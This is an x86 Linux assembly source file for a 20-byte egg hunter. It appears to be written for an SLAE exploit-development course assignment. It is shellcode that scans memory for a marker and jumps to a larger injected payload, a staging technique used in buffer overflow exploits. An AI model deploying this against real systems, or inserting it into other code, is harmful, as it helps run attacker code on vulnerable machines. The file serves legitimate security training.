; Egg Hunter (20 bytes)
;   - searches from current addr towards lower memory
;   - marker: 0x5159 (push ecx,pop ecx)
; Paw Petersen, SLAE-656
; https://www.pawpetersen.dk/slae-assignment-3-egg-hunter-linux-x86/

global _start
section .text
_start:
  jmp     call_egghunter
egghunter:
  pop     ecx                 ; save addr ptr
  sub     ecx, 23             ; move addr ptr back
next:
  cmp     word [ecx], 0x5951  ; marker
  loopnz  next                ; dec ecx, jump
  jmp ecx                     ; jump to shellcode
call_egghunter:
  call    egghunter

